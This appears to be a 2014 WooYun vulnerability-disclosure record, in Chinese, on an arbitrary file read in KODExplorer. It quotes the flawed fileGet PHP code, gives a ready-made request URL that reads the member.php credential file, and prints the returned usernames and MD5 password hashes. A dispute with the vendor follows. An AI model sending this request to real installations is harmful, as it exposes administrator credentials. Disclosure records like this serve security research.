{"id": 50937, "wybug_id": "wooyun-2014-076309", "wybug_title": "芒果云KODExlporer 任意文件读取（直接读取用户名和密码）", "wybug_corp": "千帆网络工作室", "wybug_author": "狗狗侠", "wybug_date": "2014-09-17 08:45", "wybug_open_date": "2014-12-13 08:46", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向公众公开  简要描述： 再来一蛋。。。 详细说明：  在controller\\editor.class.php文件中方法如下：\n// 获取文件数据\tpublic function fileGet(){\t\t$filename=_DIR($this->in['filename']);\t\tif (!is_readable($filename)) show_json($this->L['no_permission'],false);\t\tif (filesize($filename) >= 1024*1024*20) show_json($this->L['edit_too_big'],false);\t\t$filecontents=file_get_contents($filename);//文件内容\t\t$charset=$this->_get_charset($filecontents);\t\tif ($charset!='' || $charset!='utf-8') {\t\t\t$filecontents=mb_convert_encoding($filecontents,'utf-8',$charset);\t\t}\t\t$data = array(\t\t\t'ext'\t\t=> get_path_ext($filename),\t\t\t'name'      => iconv_app(get_path_this($filename)),\t\t\t'filename'\t=> rawurldecode($this->in['filename']),\t\t\t'charset'\t=> $charset,\t\t\t'content'\t=> $filecontents\t\t\t\t\t);\t\tshow_json($data);\t}\n这里获取$filename=_DIR($this->in['filename']);  获取$filename变量，其中_DIR自己跟踪吧！ 过程不表。厂商明白。。。然后看看$filecontents=file_get_contents($filename);//文件内容获取了文件内容本来这系统就是没有数据库的，用户名和密码直接写在member.php文件当中所以我们构造好链接即可直接获取用户名和密码了如下：http://localhost/www/index.php?editor/fileGet&filename=data/system/member.php直接菊花再现。。。。shell我就不说了\n\n\n{\"code\":true,\"use_time\":0.0172510147095,\"data\":{\"ext\":\"php\",\"name\":\"member.php\",\"filename\":\".\\/data\\/system\\/member.php\",\"charset\":\"utf-8\",\"content\":\"<?php exit;?>{\\\"admin\\\":{\\\"name\\\":\\\"admin\\\",\\\"password\\\":\\\"21232f297a57a5a743894a0e4a801fc3\\\",\\\"role\\\":\\\"root\\\",\\\"status\\\":1},\\\"guest\\\":{\\\"name\\\":\\\"guest\\\",\\\"password\\\":\\\"084e0343a0486ff05530df6c705c8bb4\\\",\\\"role\\\":\\\"guest\\\",\\\"status\\\":1},\\\"demo\\\":{\\\"name\\\":\\\"demo\\\",\\\"password\\\":\\\"fe01ce2a7fbac8fafaed7c982a04e229\\\",\\\"role\\\":\\\"default\\\",\\\"status\\\":1}}\"}}\n其中密码的md5就爆了。。。   漏洞证明：  \n\n\n{\"code\":true,\"use_time\":0.0172510147095,\"data\":{\"ext\":\"php\",\"name\":\"member.php\",\"filename\":\".\\/data\\/system\\/member.php\",\"charset\":\"utf-8\",\"content\":\"<?php exit;?>{\\\"admin\\\":{\\\"name\\\":\\\"admin\\\",\\\"password\\\":\\\"21232f297a57a5a743894a0e4a801fc3\\\",\\\"role\\\":\\\"root\\\",\\\"status\\\":1},\\\"guest\\\":{\\\"name\\\":\\\"guest\\\",\\\"password\\\":\\\"084e0343a0486ff05530df6c705c8bb4\\\",\\\"role\\\":\\\"guest\\\",\\\"status\\\":1},\\\"demo\\\":{\\\"name\\\":\\\"demo\\\",\\\"password\\\":\\\"fe01ce2a7fbac8fafaed7c982a04e229\\\",\\\"role\\\":\\\"default\\\",\\\"status\\\":1}}\"}}\n   修复方案：  都是虚假漏洞，不需要修复了   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-13 08:46 厂商回复： 虚假漏洞，管理员当然能读取信息  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-17 09:20 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  太6了- - 我還在等更新呢。。。     \n     2014-09-17 10:31 |    \t\t千帆网络工作室(乌云厂商)\t\t \n  虚假漏洞，管理员当然能读取信息能用的话你把    http://demo.kalcaddle.com/  的admin的密码的md5拿给看看(用demo用户登录)    \n     2014-09-17 10:34 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室  哈哈。真是笑死我了。    \n     2014-09-17 10:36 |    \t\t千帆网络工作室(乌云厂商)\t\t \n  @狗狗侠 无语    \n     2014-09-17 10:37 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  @千帆网络工作室 呃。。是管理员么。。。- - 如果是webshell的话倒是可以读取，    \n     2014-09-17 10:38 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室  你尊重点别人吧。下次你的洞我放外面去。让别人利用利用先。看是不是虚假的    \n     2014-09-17 10:40 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  哈哈哈。。。    \n     2014-09-17 10:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @狗狗侠 @千帆网络工作室 莫急莫急，首先狗狗侠报告在乌云上的漏洞大家都是有目共睹的，不会报告虚假漏洞给厂商。细节方面可能是有些误解或者初入，咱们厂商联合白帽子一起沟通下，弄明白漏洞。    \n     2014-09-17 10:47 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室 请问这是啥？ http://demo.kalcaddle.com/data/User/demo/home/fucka.php   你的悬赏呢。 哈哈。笑死我了    \n     2014-09-17 10:52 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  @千帆网络工作室 按照你的逻辑。是不是管理权限就可以有注入了呢。是不是管理员就可以自己读自己的md5了？    \n     2014-09-17 11:03 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  @疯狗 都惊动您老了。。。 这个管理工具挺不错的，在中国做开源也不容易。密码什么的都是php保存的。    \n     2014-09-17 11:39 |    \t\t千帆网络工作室(乌云厂商)\t\t \n  @狗狗侠 管理员还确实有所有权限，程序就是这样设计的，新建php文件，修改程序等等，遍历目录系统目录等等    \n     2014-09-17 12:12 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @狗狗侠 既然你认为是真的漏洞，大侠可以跟厂商说是怎么做到的不就可以了吗？难道还不敢说，可能厂商还没仔细看漏洞！息怒！！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}